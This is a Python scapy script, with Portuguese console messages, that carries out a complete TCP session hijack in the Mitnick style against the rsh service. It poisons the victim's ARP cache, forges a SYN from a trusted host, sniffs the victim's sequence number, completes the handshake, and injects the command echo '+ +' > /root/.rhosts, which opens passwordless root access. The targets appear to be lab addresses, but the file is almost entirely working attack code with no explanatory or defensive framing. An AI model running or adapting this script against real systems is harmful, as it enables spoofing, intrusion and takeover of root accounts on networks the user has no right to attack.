from scapy.all import *
import random
import time

conf.sniff_promisc = True


def poison_arp_cache(victim_addr, impersonated_addr, net_iface="eth0"):
    print(f"[>] Buscando endereco MAC do host {victim_addr}...")

    replies, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=victim_addr),
        timeout=2, iface=net_iface, verbose=0
    )
    victim_mac = "ff:ff:ff:ff:ff:ff"
    if replies:
        victim_mac = replies[0][1].hwsrc

    print(f"[>] Injetando entrada ARP falsa em {victim_addr} ({victim_mac}): {impersonated_addr} agora aponta para nos...")

    arp_pkt = Ether(dst=victim_mac) / ARP(
        op=2, pdst=victim_addr, hwdst=victim_mac, psrc=impersonated_addr
    )
    sendp(arp_pkt, iface=net_iface, verbose=0, count=3)

    return victim_mac


def spoof_tcp_and_send():
    victim_addr = "10.0.2.20"
    trusted_host = "10.0.2.30"
    rsh_port = 514
    net_iface = "eth0"

    fake_src_port = random.randint(512, 1023)
    while fake_src_port == 514:
        fake_src_port = random.randint(512, 1023)

    print(f"[>] Porta de origem selecionada: {fake_src_port}")

    victim_mac = poison_arp_cache(victim_addr, trusted_host, net_iface)
    time.sleep(1)

    seq_num = random.randint(1000, 2**32 - 10000)

    syn_pkt = IP(src=trusted_host, dst=victim_addr) / TCP(
        sport=fake_src_port, dport=rsh_port, flags="S", seq=seq_num
    )

    print("[>] Captura de pacotes ativa na eth0, aguardando resposta do alvo...")
    capture_filter = f"tcp and src host {victim_addr} and dst host {trusted_host}"
    pkt_sniffer = AsyncSniffer(
        filter=capture_filter, iface=net_iface, count=5, timeout=6, store=True
    )
    pkt_sniffer.start()
    time.sleep(0.5)

    print(f"[>] Disparando SYN com identidade forjada de {trusted_host}...")
    eth_frame = Ether(dst=victim_mac) / syn_pkt
    sendp(eth_frame, iface=net_iface, verbose=0)

    pkt_sniffer.join()
    sniffed_pkts = pkt_sniffer.results

    sa_reply = None
    if sniffed_pkts:
        for p in sniffed_pkts:
            if p.haslayer(TCP) and p[TCP].flags == "SA":
                sa_reply = p
                break

    if not sa_reply:
        if sniffed_pkts:
            observed_flags = ", ".join(
                sorted({str(p[TCP].flags) for p in sniffed_pkts if p.haslayer(TCP)})
            )
            print(f"[!] Pacotes recebidos, mas nenhum SYN/ACK. Flags detectadas: {observed_flags}")
        print("[!] Nao foi possivel capturar o SYN/ACK. O flood esta ativo? O ARP foi aceito?")
        return

    remote_isn = sa_reply[TCP].seq
    print(f"[+] Resposta capturada com sucesso! Numero de sequencia remoto: {remote_isn}")

    ack_val = remote_isn + 1
    seq_num += 1

    print(f"[>] Finalizando handshake TCP com ACK spoofado...")
    ack_pkt = IP(src=trusted_host, dst=victim_addr) / TCP(
        sport=fake_src_port, dport=rsh_port, flags="A",
        seq=seq_num, ack=ack_val
    )
    send(ack_pkt, iface=net_iface, verbose=0)

    print(f"[>] Transmitindo comando RSH pela conexao estabelecida...")
    rsh_data = b"0\x00root\x00root\x00echo '+ +' > /root/.rhosts\x00"

    data_pkt = IP(src=trusted_host, dst=victim_addr) / TCP(
        sport=fake_src_port, dport=rsh_port, flags="PA",
        seq=seq_num, ack=ack_val
    ) / rsh_data
    send(data_pkt, iface=net_iface, verbose=0)

    print("[+] Comando entregue. Confira o arquivo /root/.rhosts no host alvo.")


if __name__ == "__main__":
    spoof_tcp_and_send()
